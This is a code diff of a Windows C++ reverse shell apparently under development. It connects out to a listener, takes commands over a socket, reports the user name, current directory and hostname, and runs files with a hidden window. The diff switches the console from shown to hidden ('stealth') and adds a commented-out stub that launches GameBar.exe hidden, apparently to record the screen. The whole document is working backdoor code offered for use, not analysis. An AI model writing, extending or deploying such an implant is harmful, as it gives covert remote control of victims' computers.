@@ -3,7 +3,8 @@
 
 #include <winsock2.h>   //Sock Head. Includes socket functions from socket lib.
 #include <windows.h>    //Win API Head. Include Win API functions.
-//#include <ws2tcpip.h>   //TCP-IP Head. Definitions for TCP/IP protocols.
+#include <ws2tcpip.h>   //TCP-IP Head. Definitions for TCP/IP protocols.
+//#include "Shlwapi.h"
 //C Headers
 
 #include <cstdio>      //Input/Output. Main input/output operations. Least required bytes in program.
@@ -17,30 +18,41 @@
 
 #define DEFAULT_BUFLEN 1024 //Size of bytes sent and received over network.
 
-void whoami(char* returnValue, int returnSize) {
+void whoami(LPWSTR returnValue, int returnSize) {
     DWORD bufflen = 257;
     GetUserName(returnValue, &bufflen);
 }
 
-void pwd(char* returnValue, int returnSize) {
+void pwd(char *returnValue, int returnSize) {
     TCHAR tempDir[MAX_PATH];
     GetCurrentDirectory(MAX_PATH, tempDir);
     strcat(returnValue, tempDir);
 }
 
-void getHostname(char* returnValue, int returnSize) {
+void getHostname(LPWSTR returnValue, int returnSize) {
     DWORD bufferlen = 257;
     GetComputerName(returnValue, &bufferlen);
 }
 
-void execute_(char* returnValue, int returnSize, char *file) {
-    if ((int)(ShellExecute(NULL, "open", file, NULL, NULL, SW_HIDE)) <= 32) {     //Function failed if the return value is a number less than or equal to 32.
+void execute_(char *returnValue, int returnSize, LPCWSTR file) {
+    if ((int) (ShellExecute(NULL, "open", file, NULL, NULL, SW_HIDE)) <= 32) {     //Function failed if the return value is a number less than or equal to 32.
         strcat(returnValue, "Error executing...\n");
-    }
-    else {
+    } else {
         strcat(returnValue, "\n");
     }
 }
+
+/*char record(char *returnValue, int returnSize, char *file) {
+    char pathtemp[110] = "C:\\Program Files\\WindowsApps\\Microsoft.XboxGamingOverlay_3.36.6003.0_x64__8wekyb3d8bbwe\\GameBar.exe";
+    int retreval_Val = PathFileExistsA(pathtemp);
+
+    if (retreval_Val == FALSE) {
+        const char temp[30] = "path does not exist...";
+        return *temp;
+    } else {
+        ShellExecute(NULL, "open", pathtemp, NULL, NULL, SW_HIDE);
+    }
+}*/
 
 /*
  * Function to host main socket code that connects to listener
@@ -50,7 +62,7 @@ void RevShell() {
     WSADATA wsaver;     //Version info, system status, network connection, Maximum sockets, etc...
 
     //To check whether the compiled version of sockets is compatible with the older version of sockets.
-    WSAStartup(MAKEWORD(2,2), &wsaver);
+    WSAStartup(MAKEWORD(2, 2), &wsaver);
 
     SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     /*
@@ -71,16 +83,13 @@ void RevShell() {
      * If error is confirmed closesocket() closes existing socket.
      * Then, WSACleanup() terminates Winsock 2 DLL.
      * */
-    if (connect(tcpsock, (SOCKADDR*)&address, sizeof(address)) == SOCKET_ERROR) {
+    if (connect(tcpsock, (SOCKADDR *) &address, sizeof(address)) == SOCKET_ERROR) {
         closesocket(tcpsock);
         WSACleanup();
         exit(0);
-    }
-    else {
-        std::cout << "[Connected]. Waiting for input command..." << std::endl;
+    } else {
+        std::cout << "[Connected]. Waiting for input command..." << std::endl;     // Debug
         char CommandGiven[DEFAULT_BUFLEN] = "";
-#pragma clang diagnostic push
-#pragma clang diagnostic ignored "-Wmissing-noreturn"
         while (true) {
             /*
              * An infinite loop where the windows API function recv places the socket in blocking or nonblocking mode until exit
@@ -89,45 +98,43 @@ void RevShell() {
             */
 
             // Debugging
-            int results = recv(tcpsock, CommandGiven, DEFAULT_BUFLEN, 0);   //int value of buffer. Recv() returns a message received from a socket.
+            int results = recv(tcpsock, CommandGiven, DEFAULT_BUFLEN,
+                               0);   // int value of buffer. Recv() returns a message received from a socket.
 
-            std::cout << "Recieved: " << CommandGiven << std::endl;
-            std::cout << "Length of command: " << results - 1 << std::endl;
+            std::cout << "Recieved: " << CommandGiven << std::endl;              // Debug
+            std::cout << "Length of command: " << results - 1 << std::endl;      // Debug
 
             if ((strcmp(CommandGiven, "whoami\n") == 0)) {
                 char temp[257] = "";
                 whoami(temp, 257);
                 strcat(temp, "\n");
                 send(tcpsock, temp, strlen(temp) + 1, 0);
-                memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
-            }
-            else if ((strcmp(CommandGiven, "pwd\n") == 0)) {
+                memset(CommandGiven, 0, sizeof(CommandGiven));              // Resets command buffer.
+            } else if ((strcmp(CommandGiven, "pwd\n") == 0)) {
                 char temp[257] = "";
                 pwd(temp, 257);
                 strcat(temp, "\n");
                 send(tcpsock, temp, strlen(temp) + 1, 0);
-                memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
-            }
-            else if ((strcmp(CommandGiven, "hostname\n") == 0)) {
+                memset(CommandGiven, 0, sizeof(CommandGiven));              // Resets command buffer.
+            } else if ((strcmp(CommandGiven, "hostname\n") == 0)) {
                 char temp[257] = "";
                 getHostname(temp, 257);
                 strcat(temp, "\n");
                 send(tcpsock, temp, strlen(temp) + 1, 0);
                 memset(temp, 0, sizeof(temp));
-                memset(CommandGiven, 0, sizeof(CommandGiven));
-            }
-            else if ((strcmp(CommandGiven, "exit\n") == 0)) {
+                memset(CommandGiven, 0, sizeof(CommandGiven));              // Resets command buffer.
+            } else if ((strcmp(CommandGiven, "exit\n") == 0)) {
                 closesocket(tcpsock);
                 WSACleanup();
                 exit(0);
-            }
-            else {
+            } else if ((strcmp(CommandGiven, "record\n") == 0)) {
+
+            } else {
                 char nval[DEFAULT_BUFLEN] = "";
                 for (int i; i < (*(&CommandGiven + 1) - CommandGiven); ++i) {
                     if (CommandGiven[i] == *" ") {
                         break;
-                    }
-                    else {
+                    } else {
                         nval[i] = CommandGiven[i];
                     }
                 }
@@ -143,17 +150,15 @@ void RevShell() {
                     strcat(temp, "\n");
                     send(tcpsock, temp, strlen(temp) + 1, 0);
                     memset(temp, 0, sizeof(temp));
-                    memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
-                }
-                else {
+                    memset(CommandGiven, 0, sizeof(CommandGiven));              // Resets command buffer.
+                } else {
                     char temp[20] = "Invalid Command\n";
                     send(tcpsock, temp, strlen(temp) + 1, 0);
                     memset(temp, 0, sizeof(temp));
-                    memset(CommandGiven, 0, sizeof(CommandGiven));      //Resets command buffer.
+                    memset(CommandGiven, 0, sizeof(CommandGiven));              // Resets command buffer.
                 }
             }
         }
-#pragma clang diagnostic pop
     }
     closesocket(tcpsock);
     WSACleanup();
@@ -169,7 +174,7 @@ int main() {
      */
     AllocConsole(); //Assign a new console to the process.
     stealth = FindWindowA("ConsoleWindowClass", NULL);  //Find and attach stealth to the new window.
-    ShowWindow(stealth, 1);
+    ShowWindow(stealth, 0);
     /*
      * SW_SHOWNORMAL = 1 = Shown
      * SW_HIDE = 0 = Hidden
